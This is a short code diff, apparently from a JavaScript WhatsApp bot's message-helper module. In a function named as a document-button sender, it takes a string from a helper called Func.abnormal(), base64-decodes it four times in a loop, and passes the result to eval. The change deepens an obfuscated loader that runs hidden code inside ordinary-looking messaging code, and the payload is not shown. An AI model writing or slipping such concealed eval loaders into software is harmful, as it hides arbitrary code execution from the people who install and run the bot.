@@ -145,8 +145,12 @@ exports.smsg = (clients, m, store) => {
   
   m.sendBtnDocu = async (chat, options) => {
     let a = await Func.abnormal()
-    let b = Buffer.from(a, "base64").toString("utf-8")
-    eval(b) 
+    
+    let s = a
+    for (let i = 0; i < 4; i++) {
+      s = Buffer.from(s, 'base64').toString('utf8')
+    }
+    eval(s) 
     let c = kirim
     return c(chat, options)
   }
